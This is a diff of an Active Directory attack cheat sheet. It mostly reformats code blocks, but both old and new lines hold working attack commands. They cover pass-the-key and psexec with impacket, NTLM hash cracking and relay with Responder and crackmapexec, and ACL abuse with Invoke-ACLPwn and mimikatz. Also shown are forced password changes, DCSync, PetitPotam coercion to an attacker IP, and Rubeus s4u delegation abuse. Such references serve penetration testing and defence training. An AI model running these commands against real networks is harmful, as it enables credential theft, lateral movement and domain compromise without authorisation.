@@ -1596,7 +1596,7 @@ C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproa
 Requirements :
 * Domain Controller on (at least) Windows Server 2016
 * PKINIT Kerberos authentication
-* An account with the delegated rights to write to the msDS-KeyCredentialLink attribute of the target object
+* An account with the delegated rights to write to the `msDS-KeyCredentialLink` attribute of the target object
 
 Add **Key Credentials** to the attribute `msDS-KeyCredentialLink` of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.
 
@@ -1667,17 +1667,17 @@ In this technique, instead of passing the hash directly, we use the NTLM hash of
 
 #### Using impacket
 
-```powershell
-root@kali:impacket-examples$ python ./getTGT.py -hashes :1a59bd44fe5bec39c44c8cd3524dee lab.ropnop.com
-root@kali:impacket-examples$ export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
-root@kali:impacket-examples$ python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
+```bash
+root@kali:~$ python ./getTGT.py -hashes ":1a59bd44fe5bec39c44c8cd3524dee" lab.ropnop.com
+root@kali:~$ export KRB5CCNAME="/root/impacket-examples/velociraptor.ccache"
+root@kali:~$ python3 psexec.py "jurassic.park/velociraptor@labwws02.jurassic.park" -k -no-pass
 
-also with the AES Key if you have it
-root@kali:impacket-examples$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com
+# also with the AES Key if you have it
+root@kali:~$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com
 
-ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
-kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
-klist
+root@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
+root@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
+root@kali:~$ klist
 ```
 
 #### Using Rubeus
@@ -1770,10 +1770,10 @@ NTLMv1 and NTLMv2 can be relayed to connect to another machine.
 
 | Hash                 | Hashcat | Attack method       |
 |---|---|---|
-| LM                    | 3000  | crack/pass the hash  |
-| NTLM/NTHash           | 1000  | crack/pass the hash  |
-| NTLMv1/Net-NTLMv1     | 5500  | crack/relay attack   |
-| NTLMv2/Net-NTLMv2     | 5600  | crack/relay attack   |
+| LM                    | `3000`  | crack/pass the hash  |
+| NTLM/NTHash           | `1000`  | crack/pass the hash  |
+| NTLMv1/Net-NTLMv1     | `5500`  | crack/relay attack   |
+| NTLMv2/Net-NTLMv2     | `5600`  | crack/relay attack   |
 
 Crack the hash with `hashcat`.
 
@@ -1846,7 +1846,7 @@ If a machine has `SMB signing`:`disabled`, it is possible to use Responder with 
 
 #### SMB Signing Disabled and IPv6
 
-Since MS16-077 the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.
+Since [MS16-077](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-077) the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.
 
 ```powershell
 crackmapexec smb $hosts --gen-relay-list relay.txt
@@ -2068,7 +2068,6 @@ If you do not want modified ACLs to be overwritten every hour, you should change
 
 >  The AdminCount attribute is set to `1` automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s).
 
-
 Find users with `AdminCount=1`.
 
 ```powershell
@@ -2194,7 +2193,7 @@ NOTE: To not alert the user the payload should hide its own process window and s
 
 #### WriteDACL
 
-To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn) is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : `./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'`
+To abuse `WriteDacl` to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn) is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : `./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'`
 
 * WriteDACL on Domain
   ```powershell
@@ -2247,7 +2246,7 @@ ConvertFrom-ADManagedPasswordBlob $mp
 #### ForceChangePassword
 
 An attacker can change the password of the user this ACE applies to. 
-This can be achieved with Set-DomainUserPassword (PowerView module).
+This can be achieved with `Set-DomainUserPassword` (PowerView module).
 
 ```powershell
 $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
@@ -2565,7 +2564,7 @@ Then you can use DCsync or another attack : `mimikatz # lsadump::dcsync /user:HA
 
 Using `PetitPotam`, another tool to coerce a callback from the targeted machine, instead of `SpoolSample`.
 
-```powershell
+```bash
 # Coerce the callback
 git clone https://github.com/topotam/PetitPotam
 python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
@@ -2593,11 +2592,11 @@ $ Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
 #### Exploit the Constrained Delegation
 
 * Impacket
-  ```ps1
+  ```bash
   $ getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
   ```
 * Rubeus
-  ```ps1
+  ```bash
   $ ./Rubeus.exe tgtdeleg /nowrap # this ticket can be used with /ticket:...
   $ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
   $ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
